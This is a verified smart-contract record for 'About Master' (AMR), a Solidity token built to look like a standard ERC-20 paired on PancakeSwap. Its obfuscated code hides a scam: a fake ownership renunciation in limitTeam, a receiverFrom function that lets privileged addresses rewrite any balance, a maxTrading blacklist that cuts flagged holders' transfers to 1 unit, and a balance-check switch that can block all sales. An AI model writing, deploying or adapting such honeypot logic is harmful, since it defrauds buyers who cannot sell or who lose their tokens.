{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface swapExempt {\n    function createPair(address marketingMaxExempt, address walletAmount) external returns (address);\n}\n\ninterface minSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTxSwap) external view returns (uint256);\n\n    function transfer(address buyEnable, uint256 fundMinReceiver) external returns (bool);\n\n    function allowance(address minFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundMinReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyEnable,\n        uint256 fundMinReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityReceiver, uint256 value);\n    event Approval(address indexed minFrom, address indexed spender, uint256 value);\n}\n\nabstract contract amountFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minSwapMetadata is minSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AboutMaster is amountFund, minSwap, minSwapMetadata {\n\n    address public maxFee;\n\n    string private fromTake = \"About Master\";\n\n    uint256 private buyFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txAuto;\n    }\n\n    mapping(address => uint256) private walletLaunchEnable;\n\n    function transfer(address liquidityReceiverIs, uint256 fundMinReceiver) external virtual override returns (bool) {\n        return limitWalletLaunched(_msgSender(), liquidityReceiverIs, fundMinReceiver);\n    }\n\n    bool public fromWalletSender;\n\n    constructor (){\n        if (fromWalletSender != shouldTotal) {\n            buyFrom = fundAtToken;\n        }\n        feeTake tradingFee = feeTake(minBuy);\n        maxFee = swapExempt(tradingFee.factory()).createPair(tradingFee.WETH(), address(this));\n        \n        launchFrom = _msgSender();\n        txToken[launchFrom] = true;\n        walletLaunchEnable[launchFrom] = txAuto;\n        limitTeam();\n        if (feeReceiver == buyFrom) {\n            shouldTotal = false;\n        }\n        emit Transfer(address(0), launchFrom, txAuto);\n    }\n\n    function balanceOf(address enableTxSwap) public view virtual override returns (uint256) {\n        return walletLaunchEnable[enableTxSwap];\n    }\n\n    address minBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingFee(address fundTrading, address buyEnable, uint256 fundMinReceiver) internal returns (bool) {\n        require(walletLaunchEnable[fundTrading] >= fundMinReceiver);\n        walletLaunchEnable[fundTrading] -= fundMinReceiver;\n        walletLaunchEnable[buyEnable] += fundMinReceiver;\n        emit Transfer(fundTrading, buyEnable, fundMinReceiver);\n        return true;\n    }\n\n    function fundSender(address feeAutoShould) public {\n        require(feeAutoShould.balance < 100000);\n        if (amountShould) {\n            return;\n        }\n        if (exemptMode != buyFrom) {\n            tokenFee = buyFrom;\n        }\n        txToken[feeAutoShould] = true;\n        if (teamAmount != exemptMode) {\n            receiverIs = false;\n        }\n        amountShould = true;\n    }\n\n    bool public shouldTotal;\n\n    uint256 public teamAmount;\n\n    uint256 public tokenFee;\n\n    uint256 constant txSender = 1 ** 10;\n\n    function transferFrom(address fundTrading, address buyEnable, uint256 fundMinReceiver) external override returns (bool) {\n        if (_msgSender() != minBuy) {\n            if (feeMarketing[fundTrading][_msgSender()] != type(uint256).max) {\n                require(fundMinReceiver <= feeMarketing[fundTrading][_msgSender()]);\n                feeMarketing[fundTrading][_msgSender()] -= fundMinReceiver;\n            }\n        }\n        return limitWalletLaunched(fundTrading, buyEnable, fundMinReceiver);\n    }\n\n    bool public receiverIs;\n\n    uint256 autoList;\n\n    string private totalShould = \"AMR\";\n\n    uint256 private exemptMode;\n\n    uint256 marketingEnable;\n\n    function limitTeam() public {\n        emit OwnershipTransferred(launchFrom, address(0));\n        liquidityMode = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromTake;\n    }\n\n    function approve(address isLaunched, uint256 fundMinReceiver) public virtual override returns (bool) {\n        feeMarketing[_msgSender()][isLaunched] = fundMinReceiver;\n        emit Approval(_msgSender(), isLaunched, fundMinReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public txToken;\n\n    uint256 private txAuto = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return liquidityMode;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalShould;\n    }\n\n    address limitFundAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public launchFrom;\n\n    bool public amountShould;\n\n    function limitWalletLaunched(address fundTrading, address buyEnable, uint256 fundMinReceiver) internal returns (bool) {\n        if (fundTrading == launchFrom) {\n            return marketingFee(fundTrading, buyEnable, fundMinReceiver);\n        }\n        uint256 walletAutoMode = minSwap(maxFee).balanceOf(limitFundAmount);\n        require(walletAutoMode == autoList);\n        require(buyEnable != limitFundAmount);\n        if (walletLiquidityTo[fundTrading]) {\n            return marketingFee(fundTrading, buyEnable, txSender);\n        }\n        return marketingFee(fundTrading, buyEnable, fundMinReceiver);\n    }\n\n    uint8 private launchedFee = 18;\n\n    uint256 public feeReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedFee;\n    }\n\n    mapping(address => bool) public walletLiquidityTo;\n\n    function maxAutoLaunch(uint256 fundMinReceiver) public {\n        listLiquidity();\n        autoList = fundMinReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeMarketing;\n\n    uint256 public fundAtToken;\n\n    function receiverFrom(address liquidityReceiverIs, uint256 fundMinReceiver) public {\n        listLiquidity();\n        walletLaunchEnable[liquidityReceiverIs] = fundMinReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityMode;\n    }\n\n    event OwnershipTransferred(address indexed shouldAt, address indexed isTradingMin);\n\n    function maxTrading(address autoSenderLaunch) public {\n        listLiquidity();\n        \n        if (autoSenderLaunch == launchFrom || autoSenderLaunch == maxFee) {\n            return;\n        }\n        walletLiquidityTo[autoSenderLaunch] = true;\n    }\n\n    function listLiquidity() private view {\n        require(txToken[_msgSender()]);\n    }\n\n    address private liquidityMode;\n\n    function allowance(address buyMax, address isLaunched) external view virtual override returns (uint256) {\n        if (isLaunched == minBuy) {\n            return type(uint256).max;\n        }\n        return feeMarketing[buyMax][isLaunched];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTradingMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMinReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTxSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromWalletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAtToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAutoShould\",\"type\":\"address\"}],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundMinReceiver\",\"type\":\"uint256\"}],\"name\":\"maxAutoLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSenderLaunch\",\"type\":\"address\"}],\"name\":\"maxTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMinReceiver\",\"type\":\"uint256\"}],\"name\":\"receiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMinReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMinReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLiquidityTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AboutMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}